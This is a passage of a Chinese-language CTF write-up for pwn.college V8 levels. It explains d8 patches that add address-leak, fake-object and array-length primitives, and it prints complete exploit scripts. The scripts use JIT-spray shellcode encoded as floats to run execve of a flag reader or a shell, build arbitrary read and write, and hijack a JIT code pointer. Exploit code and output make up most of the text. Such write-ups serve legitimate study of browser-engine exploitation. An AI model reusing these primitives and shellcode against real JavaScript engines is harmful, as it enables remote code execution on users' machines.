make_double(asm("add rax,rbx;push rax"))
make_double(asm("mov rdi, rsp;xor esi, esi;"))
code = asm("xor edx, edx;push 0x3b; pop rax; syscall")
assert len(code) <= 8
print(hex(u64(code.ljust(8, b'\x90')))[2:])
```

这里对于 catflag 这个字符串的处理，我将这个转化为 hex 的形式，然后分成高位和低位 4 字节，分别赋值给 eax 和 ebx，然后 eax << 32 位存储到 rax 里，接着再讲低 4 字节赋值给 rax，这样字符串就处理好了，然后 push 到栈上，接着讲 rsp 赋值给 rdi，那么 execve 的第一个参数就处理好了，后面的 rsi 和 rdx 已经系统调用，对于看到这篇文章的读者，应该不会成为一个问题

看下这里执行完毕的效果

```
➜  release git:(5a2307d0f2c) ✗ python3 rop.py
ceb900067616cb8
ceb9066746163bb
ceb909020e0c148
ceb909050d80148
ceb90f631e78948
90050f583b6ad231
```

将输出赋值到 convert.js 脚本里，convert.js 脚本的内容，需要转化为 BigInt 类型，然后前面加上 0x

```
function convertShellcode() {
    const shellcodeInts = [
        0xceb900067616cb8n,
        0xceb9066746163bbn,
        0xceb909020e0c148n,
        0xceb909050d80148n,
        0xceb90f631e78948n,
        0x90050f583b6ad231n
    ];
     
    const shellcodeFloats = [];
    const buffer = new ArrayBuffer(8);
    const view = new DataView(buffer);
     
    for (const int of shellcodeInts) {
        view.setBigUint64(0, int, true);
        const float = view.getFloat64(0, true);
        shellcodeFloats.push(float);
    }
    return shellcodeFloats;
}
 
const shellcode = convertShellcode();
console.log("const shellcode = () => {return [");
shellcode.forEach((num, index) => {
    console.log(`    ${num}${index < shellcode.length - 1 ? ',' : ''}`);
});
console.log("];}");
```

输出如下，最后拷贝到 exp.js 里，这个就是我们需要的 shellcode

```
➜  release git:(5a2307d0f2c) ✗ node convert.js
const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
```

#### 遇到的一些问题

过程中遇到了很奇怪的问题（玄学），这是我一开始的脚本，必须删除一些 debug 输出，才能在远程环境中输出 flag

```
function stop(){
    %SystemBreak();
}
 
function p(arg){
    %DebugPrint(arg);
}
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
// readflag
const shellcode =()=> {return [1.9995716422075807e-246,
1.9710255944286777E-246,
1.97118242283721E-246,
1.971136949489835E-246,
1.9711826272869888E-246,
1.9711829003383248E-246,
    -9.254983612527998e+61];}
 
for(let i = 0; i< 20000; i++){
    shellcode();shellcode();
    shellcode();shellcode();
}
 
// p(shellcode);
 
 
var shellcode_addr = GetAddressOf(shellcode);
var code_addr = ArbRead32(shellcode_addr+0xc);
var ins_base_lo = ArbRead32(code_addr-1+0x14);
var ins_base_hi = ArbRead32(code_addr-1+0x14+4);
var rop_addr = BigInt(ins_base_hi) * 4294967296n + BigInt(ins_base_lo)+0x6bn;
 
logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base_lo",ins_base_lo);
logg("ins_base_hi",ins_base_hi);
logg("rop_addr",rop_addr);
logg("ins_base_lo+0x69+2",ins_base_lo+0x69+2);
 
// ins_base_lo+0x69+2
ArbWrite32(code_addr-1+0x14,ins_base_lo+0x69+2);
 
// x
 
// stop();
shellcode();
// shellcode();
// spin();
```

最终拿到 flag 的脚本

```
// gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}
 
 
const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    1.9711828988945186e-246,
    1.9710306750501128e-246,
    -6.910973738673629e-229
];}
 
 
for(let i = 0; i< 20000; i++){
    shellcode();shellcode();
    shellcode();shellcode();
}
 
var shellcode_addr = GetAddressOf(shellcode);
var code_addr = ArbRead32(shellcode_addr+0xc);
var ins_base_lo = ArbRead32(code_addr-1+0x14);
var ins_base_hi = ArbRead32(code_addr-1+0x14+4);
var rop_addr = BigInt(ins_base_hi) * 4294967296n + BigInt(ins_base_lo)+0x6bn;
 
 
ArbWrite32(code_addr-1+0x14,ins_base_lo+0x69+2);
 
shellcode();
```

### exp

以下为最终的脚本，修改了 shellcode 执行的次数之后，可以稳定的输出 flag，但是笔者 debug 了一下两个脚本的区别，最后的优化代码都是 Maglev 生成的，且 size 相同，没有查到根本原因，如果有知道的师傅，可以 d 一下笔者

```
// function stop(){
//     %SystemBreak();
// }
 
// function p(arg){
//     %DebugPrint(arg);
// }
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
 
const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
 
for(let i = 0; i< 0x10000; i++){
    shellcode();
}
 
var shellcode_addr = GetAddressOf(shellcode);
var code_addr = ArbRead32(shellcode_addr+0xc);
var ins_base_lo = ArbRead32(code_addr-1+0x14);
var ins_base_hi = ArbRead32(code_addr-1+0x14+4);
var rop_addr = BigInt(ins_base_hi) * 4294967296n + BigInt(ins_base_lo)+0x6bn;
 
logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base_lo",ins_base_lo);
logg("ins_base_hi",ins_base_hi);
logg("rop_addr",rop_addr);
logg("ins_base_lo+0x69+2",ins_base_lo+0x69+2);
 
ArbWrite32(code_addr-1+0x14,ins_base_lo+0x69+2);
 
shellcode();
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_mk4angFLTm.png)

level-3
=======

环境搭建
----

> 漏洞分析里有完整的 patch 内容

```
git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff
gclient sync -D
git apply < ./patch
gn gen out/release
```

修改编译参数

```
➜  release git:(5a2307d0f2c) ✗ cat args.gn
# Set build arguments here. See `gn help buildargs`.
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false
use_goma = false
v8_code_pointer_sandboxing = false
```

编译

```
autoninja -C out/release d8
```

漏洞分析
----

patch 了两个很经典的原语，分别用于获取 obj 的地址和伪造 obj

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_Gt3JU_kIIh.png)

GetAddressOf 的实现。获取 isolate，限制参数长度不能为 0，限制参数的类型必须为 gc 管理的对象，类型转化下，然后获取 obj 的地址

```
+void Shell::GetAddressOf(const v8::FunctionCallbackInfo& info) {
+  v8::Isolate* isolate = info.GetIsolate();
+
+  if (info.Length() == 0) {
+    isolate->ThrowError("First argument must be provided");
+    return;
+  }
+
+  internal::Handle arg = Utils::OpenHandle(*info[0]);
+  if (!IsHeapObject(*arg)) {
+    isolate->ThrowError("First argument must be a HeapObject");
+    return;
+  }
+  internal::Tagged obj = internal::Cast(*arg);
+
+  uint32_t address = static_cast(obj->address());
+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
+} 
```

GetFakeObject 的实现。获取 isolate 和对应的上下文环境，限制参数的长度必须为 1 且为 number 类型，获取 addr，将被压缩的指针恢复为原来的地址，cast 为 obj 类型，接着调用 obj_handle 转化为 obj。

这里 obj_handle 的类型其实还是会做一些检查的，伪造的时候还是需要去伪造 map、prototype 等，以确保是一个看起来正确的 obj

```
+void Shell::GetFakeObject(const v8::FunctionCallbackInfo& info) {
+  v8::Isolate *isolate = info.GetIsolate();
+  Local context = isolate->GetCurrentContext();
+
+  if (info.Length() != 1) {
+    isolate->ThrowError("Need exactly one argument");
+    return;
+  }
+
+  Local arg;
+  if (!info[0]->ToUint32(context).ToLocal(&arg)) {
+    isolate->ThrowError("Argument must be a number");
+    return;
+  }
+ 
+  uint32_t addr = arg->Value();
+
+  internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
+  internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
+  uint64_t full_addr = base_addr + (uint64_t)addr;
+
+  internal::Tagged obj = internal::HeapObject::FromAddress(full_addr);
+  internal::Isolate *i_isolate = reinterpret_cast(isolate);
+  internal::Handle obj_handle(obj, i_isolate);
+  info.GetReturnValue().Set(ToApiHandle(obj_handle));
+} 
```

下面是完整的 diff 内容

```
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..0299ed26802 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -1283,6 +1283,52 @@ struct ModuleResolutionData {
  
 }  // namespace
  
+void Shell::GetAddressOf(const v8::FunctionCallbackInfo& info) {
+  v8::Isolate* isolate = info.GetIsolate();
+
+  if (info.Length() == 0) {
+    isolate->ThrowError("First argument must be provided");
+    return;
+  }
+
+  internal::Handle arg = Utils::OpenHandle(*info[0]);
+  if (!IsHeapObject(*arg)) {
+    isolate->ThrowError("First argument must be a HeapObject");
+    return;
+  }
+  internal::Tagged obj = internal::Cast(*arg);
+
+  uint32_t address = static_cast(obj->address());
+  info.GetReturnValue().Set(v8::Integer::NewFromUnsigned(isolate, address));
+}
+
+void Shell::GetFakeObject(const v8::FunctionCallbackInfo& info) {
+  v8::Isolate *isolate = info.GetIsolate();
+  Local context = isolate->GetCurrentContext();
+
+  if (info.Length() != 1) {
+    isolate->ThrowError("Need exactly one argument");
+    return;
+  }
+
+  Local arg;
+  if (!info[0]->ToUint32(context).ToLocal(&arg)) {
+    isolate->ThrowError("Argument must be a number");
+    return;
+  }
+ 
+  uint32_t addr = arg->Value();
+
+  internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();
+  internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);
+  uint64_t full_addr = base_addr + (uint64_t)addr;
+
+  internal::Tagged obj = internal::HeapObject::FromAddress(full_addr);
+  internal::Isolate *i_isolate = reinterpret_cast(isolate);
+  internal::Handle obj_handle(obj, i_isolate);
+  info.GetReturnValue().Set(ToApiHandle(obj_handle));
+}
+
 void Shell::ModuleResolutionSuccessCallback(
     const FunctionCallbackInfo& info) {
   DCHECK(i::ValidateCallbackInfo(info));
@@ -3364,7 +3410,11 @@ Local Shell::CreateNodeTemplates(
  
 Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+  global_template->Set(isolate, "GetAddressOf",
+                       FunctionTemplate::New(isolate, GetAddressOf));
+  global_template->Set(isolate, "GetFakeObject",
+                       FunctionTemplate::New(isolate, GetFakeObject));
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3435,13 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3460,7 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
  
   return global_template;
 }
diff --git a/src/d8/d8.h b/src/d8/d8.h
index a19d4a0eae4..fbb091afbaf 100644
--- a/src/d8/d8.h
+++ b/src/d8/d8.h
@@ -507,6 +507,8 @@ class Shell : public i::AllStatic {
   };
   enum class CodeType { kFileName, kString, kFunction, kInvalid, kNone };
  
+  static void GetAddressOf(const v8::FunctionCallbackInfo& args);
+  static void GetFakeObject(const v8::FunctionCallbackInfo& args);
   static bool ExecuteString(Isolate* isolate, Local source,
                             Local name,
                             ReportExceptions report_exceptions, 
```

漏洞利用
----

有 GetAddressOf 和 GetFakeObject，可以通过这两个原语来构造出一个 fake_array，从而实现 AAR 和 AAW

可以看下图

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_mDMtR5Of2S.png)

通过在某一地址处伪造出 map 和 prototype，然后可以通过 GetAddressOf 获取其地址，接着写入 prototype 的值，写成 0 就可以。接着人为构造一个 array，通过 GetAddressOf 获取到 elements 的地址，然后可以写死到 fake_array 里，length 就可以自定。

那么就会得到这样一个 fake_array

```
var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
 
function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
 
var fake_array = [
    lh_u32_to_f64(fake_map_addr+1,0),
    lh_u32_to_f64(rw_array_element_addr+1,0x100)
]
```

通过 GetAddressOf 获取到 fake_array 的地址之后，接着使用 GetFakeObject 就可以获取到一个 fake_obj，然后通过这个 fake_obj 实现 AAR 和 AAW

> cage_read/write 的命名有点问题，这里没开沙箱，后来笔者写这篇博客的时候发现了，懒得改了

```
function cage_read(addr){
    fake_array[1] = lh_u32_to_f64(Number(addr)-8+1,0x100);
    return Number(f64_to_u64(fake_obj[0]));
}
 
function cage_write(addr,val){
    fake_array[1] = lh_u32_to_f64(addr-8+1,0x100);
    fake_obj[0] = u64_to_f64(val);
}
```

接着利用 JIT Spray

```
var shellcode_addr = GetAddressOf(shellcode);
var code_addr = cage_read(shellcode_addr+0xc) >> 32;
var ins_base = cage_read(code_addr-1+0x14);
 
logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);
logg("rop_addr",ins_base+0x6b);
 
cage_write(code_addr-1+0x14,BigInt(ins_base+0x6b))
 
 
// stop();
shellcode();
```

exp
---

```
var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
 
function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
 
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
 
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}
 
// function stop(){
//     %SystemBreak();
// }
 
// function p(arg){
//     %DebugPrint(arg);
// }
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
 
// // gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}
 
const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
 
for(let i = 0; i< 0x10000; i++){
    shellcode();
}
 
// p(shellcode);
 
var rw_array = [1.1,2.2,3.3,4.4];
var fake_map = [u64_to_f64(0x3600000a001c0261n), u64_to_f64(0x0a0007ff11000844n)];
var fake_map_addr = GetAddressOf(fake_map) + 0x24 + 0x30;
var rw_array_element_addr = GetAddressOf(rw_array)-0x28;
//
 
var fake_array = [
    lh_u32_to_f64(fake_map_addr+1,0),
    lh_u32_to_f64(rw_array_element_addr+1,0x100)
]
 
var fake_array_addr = GetAddressOf(fake_array)+0x24+0x30;
var fake_obj = GetFakeObject(fake_array_addr);
 
// p(rw_array);
// p(fake_array);
// p(fake_map);
// logg("fake_map_addr",fake_map_addr);
// logg("rw_array_element_addr",rw_array_element_addr);
// logg("fake_array_addr",fake_array_addr);
 
// console.log(typeof fake_obj);
 
function cage_read(addr){
    fake_array[1] = lh_u32_to_f64(Number(addr)-8+1,0x100);
    return Number(f64_to_u64(fake_obj[0]));
}
 
function cage_write(addr,val){
    fake_array[1] = lh_u32_to_f64(addr-8+1,0x100);
    fake_obj[0] = u64_to_f64(val);
}
 
var shellcode_addr = GetAddressOf(shellcode);
var code_addr = cage_read(shellcode_addr+0xc) >> 32;
var ins_base = cage_read(code_addr-1+0x14);
 
logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);
logg("rop_addr",ins_base+0x6b);
 
cage_write(code_addr-1+0x14,BigInt(ins_base+0x6b))
 
 
// stop();
shellcode();
 
// spin();
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_CCZEJhULkX.png)

level-4
=======

环境搭建
----

> 漏洞分析里有完整的 patch 内容

```
git reset --hard 5a2307d0f2c5b650c6858e2b9b57b335a59946ff
gclient sync -D
git apply < ./patch
gn gen out/release
```

修改编译参数

```
➜  release cat args.gn     
# Set build arguments here. See `gn help buildargs`.
is_component_build = false
is_debug = false
target_cpu = "x64"
v8_enable_sandbox = false
v8_enable_backtrace = true
v8_enable_disassembler = true
v8_enable_object_print = true
dcheck_always_on = false
use_goma = false
v8_code_pointer_sandboxing = false
```

编译

```
autoninja -C out/release d8
```

漏洞分析
----

patch 了一个`setLength`方法

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_YFjCqaPG0b.png)

这里将 length 转化为 smi，注意下就行。然后检测下 receiver 的类型，就直接赋值了，修改了 array 的长度

```
+ArrayPrototypeSetLength(
+  js-implicit context: NativeContext, receiver: JSAny)(length: JSAny): JSAny {
+    try {
+      const len: Smi = Cast(length) otherwise ErrorLabel;
+      const array: JSArray = Cast(receiver) otherwise ErrorLabel;
+      array.length = len;
+    } label ErrorLabel {
+        Print("Nope");
+    }
+    return receiver;
+}
+} 
```

完整的 patch 内容

```
diff --git a/BUILD.gn b/BUILD.gn
index c0192593c4a..83e264723f7 100644
--- a/BUILD.gn
+++ b/BUILD.gn
@@ -1889,6 +1889,7 @@ if (v8_postmortem_support) {
 }
  
 torque_files = [
+  "src/builtins/array-setlength.tq",
   "src/builtins/aggregate-error.tq",
   "src/builtins/array-at.tq",
   "src/builtins/array-concat.tq",
diff --git a/src/builtins/array-setlength.tq b/src/builtins/array-setlength.tq
new file mode 100644
index 00000000000..4a2a864af44
--- /dev/null
+++ b/src/builtins/array-setlength.tq
@@ -0,0 +1,14 @@
+namespace array {
+transitioning javascript builtin
+ArrayPrototypeSetLength(
+  js-implicit context: NativeContext, receiver: JSAny)(length: JSAny): JSAny {
+    try {
+      const len: Smi = Cast(length) otherwise ErrorLabel;
+      const array: JSArray = Cast(receiver) otherwise ErrorLabel;
+      array.length = len;
+    } label ErrorLabel {
+        Print("Nope");
+    }
+    return receiver;
+}
+}
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index facf0d86d79..382c015bc48 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -3364,7 +3364,7 @@ Local Shell::CreateNodeTemplates(
  
 Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   Local global_template = ObjectTemplate::New(isolate);
-  global_template->Set(Symbol::GetToStringTag(isolate),
+/*  global_template->Set(Symbol::GetToStringTag(isolate),
                        String::NewFromUtf8Literal(isolate, "global"));
   global_template->Set(isolate, "version",
                        FunctionTemplate::New(isolate, Version));
@@ -3385,13 +3385,13 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   global_template->Set(isolate, "readline",
                        FunctionTemplate::New(isolate, ReadLine));
   global_template->Set(isolate, "load",
-                       FunctionTemplate::New(isolate, ExecuteFile));
+                       FunctionTemplate::New(isolate, ExecuteFile));*/
   global_template->Set(isolate, "setTimeout",
                        FunctionTemplate::New(isolate, SetTimeout));
   // Some Emscripten-generated code tries to call 'quit', which in turn would
   // call C's exit(). This would lead to memory leaks, because there is no way
   // we can terminate cleanly then, so we need a way to hide 'quit'.
-  if (!options.omit_quit) {
+/*  if (!options.omit_quit) {
     global_template->Set(isolate, "quit", FunctionTemplate::New(isolate, Quit));
   }
   global_template->Set(isolate, "testRunner",
@@ -3410,7 +3410,7 @@ Local Shell::CreateGlobalTemplate(Isolate* isolate) {
   if (i::v8_flags.expose_async_hooks) {
     global_template->Set(isolate, "async_hooks",
                          Shell::CreateAsyncHookTemplate(isolate));
-  }
+  }*/
  
   return global_template;
 }
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 48249695b7b..f3379ac47ec 100644
--- a/src/init/bootstrapper.cc
+++ b/src/init/bootstrapper.cc
@@ -2531,6 +2531,8 @@ void Genesis::InitializeGlobal(Handle global_object,
     JSObject::AddProperty(isolate_, proto, factory->constructor_string(),
                           array_function, DONT_ENUM);
  
+    SimpleInstallFunction(isolate_, proto, "setLength",
+                          Builtin::kArrayPrototypeSetLength, 1, true);
     SimpleInstallFunction(isolate_, proto, "at", Builtin::kArrayPrototypeAt, 1,
                           true);
     SimpleInstallFunction(isolate_, proto, "concat", 
```

漏洞利用
----

我们可以修改 array 的 length，那么其实意味着我们可以有一个越界写，但是经过笔者的测试发现，他其实只是修改了这个 JSArray 的 length，但是 element 的 length 并没有修改，然后笔者推测越界写应该是有一个 check，然后导致了越界写的失败，所以我们这里只能有一个越界读

似乎还有一个解释，这里的 JSArray 采用了懒加载，就是虽然设置了 0x1000，但如果其实没有用到那么大的空间的时候，就不会初始化后面的空间，所以有的时候越界读会堵到 NAN，这个有点像延迟绑定????

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_BHajQyCJUY.png)

那么我们可以利用如下代码构造如下的结构，构造两个相邻的 double_array

```
var array = new Array(0x1000).fill(1.1)
var rw_array = new Array(0x1000).fill(2.2);
 
array.setLength(0x10000);
 
var double_map_addr = u64_to_u32_lo(f64_to_u64(array[0x1000]));
var double_prototype_addr = u64_to_u32_hi(f64_to_u64(array[0x1000]));
 
logg("double_array_map",double_map_addr)
logg("double_prototype_addr",double_prototype_addr)
```

利用 oob 读取下一个 double_array 的 map 和 prototype

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_jqC41kuXPa.png)

有了 double_array 的 map 和 prototype，想要构造 addressOf 的原语，这里还需要一个 obj_map 和 prototype，因为有了一个越界读，所以可以通过修改一个正常 obj 的 elements 来实现 AAR 和 AAW，因此这里不需要构造 fakeObject 也同样可以实现 AAR 和 AAW

所以接着可以构造 double_array 和 obj 相邻的结构，代码如下

```
var rw_array = new Array(0x1000).fill(2.2);
var obj = {array,rw_array};
 
// 方法2
rw_array.setLength(0x10000);
var obj_map_addr = u64_to_u32_lo(f64_to_u64(rw_array[0x1000]));
var obj_prototype_addr = u64_to_u32_hi(f64_to_u64(rw_array[0x1000]));
 
logg("obj_map_addr",obj_map_addr)
logg("obj_prototype_addr",obj_prototype_addr)
```

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_FyYVEMBNfk.png)

此时已经具备了所有构造的条件，先看下 addressOf 的实现

```
function addressOf(object){
    rw_array[0x1000] = lh_u32_to_f64(obj_map_addr,obj_prototype_addr);
    obj[0] = object;
    rw_array[0x1000] = lh_u32_to_f64(double_map_addr,double_prototype_addr);
    return u64_to_u32_lo(f64_to_u64(obj[0]));
}
```

其实就是如下的结构，通过 rw_array 的越界写，修改 obj 的 map，这样改变了其索引 element 的方式，可以获取任意对象的地址

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_tBX-ch-xp1.png)

接着构造 AAR，

```
function AAR(addr){
    rw_array[0x1000] = lh_u32_to_f64(double_map_addr,double_prototype_addr);
    rw_array[0x1001] = lh_u32_to_f64((addr - 8) | tag,0x20000);
    // rw_array[0x1000] = lh_u32_to_f64(obj_map_addr,obj_prototype_addr);
    return f64_to_u64(obj[0]);
}
```

利用 rw_array 的越界写，修改 obj 的第一个 element，然后 obj[0] 就可以访问到指定地址内容了

细心的读者可能会注意到，这里的 addr-8，原因是 elemnet 索引的时候，开头的八个字节是 map 和 prototype，所以访问第一个元素是 addr+8，相对应的，我们想要实现任意地址读写的效果，这里就需要 addr-8

![](https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/pwncollege/image_PLy_FNXehq.png)

下面的 AAW 其实是一样的，只不过 AAR 是通过 obj[0] 访问元素，这里是通过 obj[0] = xxx; 赋值，来修改内容

```
function AAW(addr,val){
    rw_array[0x1000] = lh_u32_to_f64(double_map_addr,double_prototype_addr);
    rw_array[0x1001] = lh_u32_to_f64((addr - 8) | tag,0x20000);
    // let lo = Number(BigInt(val) & 0xffffffffn);
    // let hi = Number((BigInt(val) >> 32n) & 0xffffffffn);
    // logg("lo",lo);
    // logg("hi",hi);
    // obj[0] = lh_u32_to_f64(lo,hi);
    obj[0] = u64_to_f64(val);
}
```

可以看到注释，这里踩了一个坑，这里 Number 和 BigInt 转化的时候出现了精度损失

下面就是用 JIT Spray 来指令执行了，和前面的流程一致

```
var shellcode_addr = addressOf(shellcode);
var code_addr = AAR(shellcode_addr+0xc) & 0xffffffffn;
var ins_base = AAR(Number(code_addr)-1+0x14);
 
logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);
logg("rop_addr",ins_base+0x6bn);
 
AAW(Number(code_addr)-1+0x14,BigInt(ins_base+0x6bn))
 
shellcode();
```

exp
---

```
var buf = new ArrayBuffer(8);
var f32 = new Float32Array(buf);
var f64 = new Float64Array(buf);
var u32 = new Uint32Array(buf);
var u64 = new BigUint64Array(buf);
 
function lh_u32_to_f64(l,h){
    u32[0] = l;
    u32[1] = h;
    return f64[0];
}
 
function f64_to_u64(val){
    f64[0] = val;
    return u64[0];
}
 
function u64_to_f64(val){
    u64[0] = val;
    return f64[0];
}
 
function u64_to_u32_lo(val){
    u64[0] = val;
    return u32[0];
}
 
function u64_to_u32_hi(val){
    u64[0] = val;
    return u32[1];
}
 
function u32_to_f32(val){
    u32[0] = val;
    return f32[0];
}
 
// function stop(){
//     %SystemBreak();
// }
 
// function p(arg){
//     %DebugPrint(arg);
// }
 
function spin(){
    while(1){};
}
 
function hex(str){
    return str.toString(16).padStart(16,0);
}
 
function logg(str,val){
    console.log("[+] "+ str + ": " + "0x" + hex(val));
}
 
// // gain shell
// const shellcode = () => {return [
//     1.9553825422107533e-246,
//     1.9560612558242147e-246,
//     1.9995714719542577e-246,
//     1.9533767332674093e-246,
//     2.6348604765229606e-284
// ];}
 
const shellcode = () => {return [
    1.9710255944286777e-246,
    1.971136949489835e-246,
    1.97118242283721e-246,
    1.9711826272864685e-246,
    1.9712937950614383e-246,
    -1.6956275879669133e-231
];}
 
for(let i = 0; i< 10000; i++){
    shellcode();
}
 
// js_heap_defragment();
var tag = 1;
var array = new Array(0x1000).fill(1.1)
var rw_array = new Array(0x1000).fill(2.2);
var obj = {array,rw_array};
 
array.setLength(0x10000);
 
 
// p(array);
// p(rw_array);
// p(obj);
 
 
var double_map_addr = u64_to_u32_lo(f64_to_u64(array[0x1000]));
var double_prototype_addr = u64_to_u32_hi(f64_to_u64(array[0x1000]));
 
// // 方法1
// var obj_map_addr = u64_to_u32_lo(f64_to_u64(array[0x2805]));
// var obj_prototype_addr = u64_to_u32_hi(f64_to_u64(array[0x2805]));
 
// 方法2
rw_array.setLength(0x10000);
var obj_map_addr = u64_to_u32_lo(f64_to_u64(rw_array[0x1000]));
var obj_prototype_addr = u64_to_u32_hi(f64_to_u64(rw_array[0x1000]));
 
logg("double_array_map",double_map_addr)
logg("double_prototype_addr",double_prototype_addr)
 
logg("obj_map_addr",obj_map_addr)
logg("obj_prototype_addr",obj_prototype_addr)
 
 
function addressOf(object){
    rw_array[0x1000] = lh_u32_to_f64(obj_map_addr,obj_prototype_addr);
    obj[0] = object;
    rw_array[0x1000] = lh_u32_to_f64(double_map_addr,double_prototype_addr);
    return u64_to_u32_lo(f64_to_u64(obj[0]));
}
 
function AAR(addr){
    rw_array[0x1000] = lh_u32_to_f64(double_map_addr,double_prototype_addr);
    rw_array[0x1001] = lh_u32_to_f64((addr - 8) | tag,0x20000);
    // rw_array[0x1000] = lh_u32_to_f64(obj_map_addr,obj_prototype_addr);
    return f64_to_u64(obj[0]);
}
 
function AAW(addr,val){
    rw_array[0x1000] = lh_u32_to_f64(double_map_addr,double_prototype_addr);
    rw_array[0x1001] = lh_u32_to_f64((addr - 8) | tag,0x20000);
    // let lo = Number(BigInt(val) & 0xffffffffn);
    // let hi = Number((BigInt(val) >> 32n) & 0xffffffffn);
    // logg("lo",lo);
    // logg("hi",hi);
    // obj[0] = lh_u32_to_f64(lo,hi);
    obj[0] = u64_to_f64(val);
}
 
// p(shellcode);
var shellcode_addr = addressOf(shellcode);
var code_addr = AAR(shellcode_addr+0xc) & 0xffffffffn;
var ins_base = AAR(Number(code_addr)-1+0x14);
 
logg("shellcode_addr",shellcode_addr);
logg("code_addr",code_addr);
logg("ins_base",ins_base);
logg("rop_addr",ins_base+0x6bn);
 
AAW(Number(code_addr)-1+0x14,BigInt(ins_base+0x6bn))
 
// stop();
shellcode();
 
 
 
 
// spin();
```

